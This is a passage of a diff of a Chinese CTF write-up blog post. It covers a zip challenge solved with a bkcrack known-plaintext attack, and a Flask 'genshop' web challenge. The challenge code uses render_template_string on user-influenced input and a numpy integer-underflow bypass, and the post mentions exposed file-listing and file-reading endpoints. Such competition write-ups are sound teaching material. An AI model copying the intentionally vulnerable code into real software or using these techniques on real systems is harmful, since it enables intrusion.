class="built_in">int</span>, end: <span class="built_in">int</span>, prefix: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>, suffix: <span class="built_in">str</span> = <span class="string">&quot;.zip&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    批量处理 0.zip ~ 15.zip 这类文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    results = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">        zip_path = Path(<span class="string">f&quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;i&#125;</span><span class="subst">&#123;suffix&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> zip_path.exists():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;zip_path&#125;</span> 不存在，跳过&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res = process_zip(zip_path)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            results[i] = res</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到结果: <span class="subst">&#123;i&#125;</span>.zip -&gt; <span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            results[i] = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;i&#125;</span>.zip 未找到匹配结果&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 批量处理 0.zip ~ 15.zip</span></span><br><span class="line">    results = batch_process(<span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] 最终结果汇总:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, res <span class="keyword">in</span> <span class="built_in">sorted</span>(results.items()):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>.zip: <span class="subst">&#123;res <span class="keyword">if</span> res <span class="keyword">else</span> <span class="string">&#x27;未找到&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 拼接所有结果（如果是 flag 分片）</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join([res <span class="keyword">for</span> res <span class="keyword">in</span> results.values() <span class="keyword">if</span> res])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 拼接结果: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312191626943.png" alt="image-20260312191626943"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312191626943.png" alt="image-20260312191626943"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19N/id+O8PA1l9SuuQ4JiS7edG9Og8TaTXUIakkm1gHQ/X77iR4IpKy</span><br></pre></td></tr></table></figure>
 
 <p>这个也不是密码，压缩包里是一个elf文件，使用明文攻击爆破，这里是32位elf，文件头用<code>7f454c46010101000000000000000000</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 5.zip -c generate_key -x 0 &quot;7f454c46010101000000000000000000&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312214257847.png" alt="image-20260312214257847"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312214257847.png" alt="image-20260312214257847"></p>
 <p>然后就得到了这个generate_key这个文件，后来才知道剪贴板有密码</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313145130586.png" alt="image-20260313145130586"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313145130586.png" alt="image-20260313145130586"></p>
 <p>ASHFK4567315，然后就得到这个elf，知道有个字符串ZIKT001NIKH7WZYGQWZZH，上面压缩包得到的密文需要密码，应该就是这个key，土哥分析这个elf也没分析出啥，我目前还没看到关于这一题题解的文章，欢迎指正交流。</p>
 <p>续上：</p>
 <p>就当我准备结束这篇文章，打开微信一看</p>
-<img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313192702607.png" alt="image-20260313192702607" style="zoom: 67%;">
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313192702607.png" alt="image-20260313192702607" style="zoom: 67%;">
 
 <p>谁懂我当时看到这篇文章是的心情，简直就是及时雨。看了大佬思路，就是分析那个二进制文件，里面有3个函数bac，b5c，b1c，我不会用ida这里就不展示了，具体可以参考大佬文章</p>
 <p>经过这3个函数处理后就得到了key</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x21665166B586B56255625582511225725562211255</span><br></pre></td></tr></table></figure>
 
 <p>这里补充一个点，为什么脚本得到的是<code>21665166B586B56255625582511225725562211255</code>最后的key是<code>0x21665166b586b562556255825112257255622112550a</code>ida中分析得到的key最后会加一个\n，所以key要加一个0a，</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313210019493.png" alt="image-20260313210019493"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313210019493.png" alt="image-20260313210019493"></p>
 <p>最后用puzzlesovler或者随波逐流都可以解出来</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201041041.png" alt="image-20260313201041041"></p>
-<p>​    <img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201102567.png" alt="image-20260313201102567"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201041041.png" alt="image-20260313201041041"></p>
+<p>​    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260313201102567.png" alt="image-20260313201102567"></p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="cybers"><a href="#cybers" class="headerlink" title="cybers"></a>cybers</h2><p>web部分就3到题，我主要写的是第二题，第一题直接被我土哥用ai写出来了，所以我也没看题。主要分析第二题</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312112209862.png" alt="image-20260312112209862"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312112209862.png" alt="image-20260312112209862"></p>
 <p>首先分析题目附件</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, session</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()</span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = binascii.hexlify(os.urandom(<span class="number">24</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">limiter = Limiter(app=app, key_func=get_user, default_limits=[<span class="string">&#x27;5/minute&#x27;</span>])</span><br><span class="line">letters = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">429</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_exception</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h1&gt;How about we access this page later?&lt;/h1&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to the genshop&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stimulate</span>():</span><br><span class="line">    initial_5_star_rate = <span class="number">0.6</span> / <span class="number">100</span></span><br><span class="line">    total_draws = <span class="number">0</span></span><br><span class="line">    start_increasing_at = <span class="number">74</span></span><br><span class="line">    end_increasing_at = <span class="number">91</span></span><br><span class="line">    current_5_star_rate = initial_5_star_rate</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        total_draws += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> total_draws &gt;= start_increasing_at <span class="keyword">and</span> total_draws &lt; end_increasing_at:</span><br><span class="line">            current_5_star_rate += <span class="number">0.06</span></span><br><span class="line">        <span class="keyword">if</span> random.random() &lt; current_5_star_rate:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> total_draws</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()</span><br><span class="line">    limiter.reset()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gift&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_money</span>():</span><br><span class="line">    int_money = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>)) &lt; <span class="number">80</span>:</span><br><span class="line">            int_money = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are so greedy!&quot;</span></span><br><span class="line">    session[<span class="string">&#x27;money&#x27;</span>] = (int_money + session[<span class="string">&#x27;money&#x27;</span>]) <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys() <span class="keyword">else</span> int_money</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;friend give you <span class="subst">&#123;int_money&#125;</span> money&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/money&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_money</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys():</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(session.get(<span class="string">&#x27;money&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chest&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chest</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        int_money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        int_money = <span class="number">0</span></span><br><span class="line">    money = int_money</span><br><span class="line">    num = random.randint(<span class="number">0</span>, <span class="number">101</span>)</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">20</span>:</span><br><span class="line">        money += <span class="number">1</span></span><br><span class="line">        chest_type = <span class="string">&quot;common&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">20</span> &lt;= num &lt; <span class="number">60</span>:</span><br><span class="line">        money += <span class="number">2</span></span><br><span class="line">        chest_type = <span class="string">&quot;exquisite&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">60</span> &lt;= num &lt; <span class="number">77</span>:</span><br><span class="line">        money += <span class="number">3</span></span><br><span class="line">        chest_type = <span class="string">&quot;precious&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">77</span> &lt;= num &lt; <span class="number">99</span>:</span><br><span class="line">        money += <span class="number">4</span></span><br><span class="line">        chest_type = <span class="string">&quot;remarkable&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        money += <span class="number">5</span></span><br><span class="line">        chest_type = <span class="string">&quot;shrine&quot;</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;money&#x27;</span>] = money</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Congratulations! You found a <span class="subst">&#123;chest_type&#125;</span> chest&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/genshop&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_letter</span>():</span><br><span class="line">    letter = request.form.get(<span class="string">&quot;letter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> letter <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Please choose a letter&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>)) <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        money = <span class="number">0</span></span><br><span class="line">    money = np.array(money)</span><br><span class="line">    money -= stimulate() * <span class="number">5000</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> money &lt; <span class="number">0</span>:</span><br><span class="line">            result = <span class="string">&quot;You don&#x27;t have enough money&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span></span><br><span class="line">            letter = waf(letter)</span><br><span class="line">            result = <span class="string">&quot;You are not allowed to use this letter&quot;</span></span><br><span class="line">            <span class="keyword">if</span> letter <span class="keyword">not</span> <span class="keyword">in</span> letters:</span><br><span class="line">                result = <span class="string">f&quot;The <span class="subst">&#123;letter&#125;</span> is not in the genshop&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">f&quot;Congratulations! You get the letter: <span class="subst">&#123;letter&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&lt;h3&gt;<span class="subst">&#123;result&#125;</span>&lt;/h3&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -369,12 +281,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">money = np.array(money)</span><br><span class="line">    money -= stimulate() * 5000</span><br></pre></td></tr></table></figure>
 
 <p>我们初始化的金币为0，在hack路由下可以获得金币，一个小时1次，一次最多99，但是抽一次是5000，那到比赛结束抢的钱也不够，这里绕过需要负整数溢出，这python中int类型是可以动态扩大的，就是没有边界，但是<code>np.array()</code>这个有c语言底层冲突，int类型是由限制的最小到-9223372036854775808，当数值小于或者就回调整为一个极大的数值，就是会绕道最大值，</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312115513482.png" alt="image-20260312115513482"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260312115513482.png" alt="image-20260312115513482"></p>
 <p>图片来自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nxhHS6mWlUO2JSi7IQSSPA?scene=0&subscene=90">2026第十届“楚慧杯”湖北省网络与数据安全实践能力竞赛初赛Writeup</a></p>
 <p>其实审计的发现调用了waf()函数，但是代码中并没有定义，在前端还暴露了两个接口</p>
 <p><code>listDir()</code>列出目录文件<code>/list?path=${path}</code>】<code>/read?file=${path}</code>传参：文件路径，结果输出到状态区</p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183315567.png" alt="image-20260310183315567"></p>
-<p><img src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183448484.png" alt="image-20260310183448484"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183315567.png" alt="image-20260310183315567"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/03/11/%E6%A5%9A%E6%85%A7%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/image-20260310183448484.png" alt="image-20260310183448484"></p>
 <p>一共有两个app.py，也就是出题人给的附件是不完整的，分别读取一下这两个app.py     </p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span 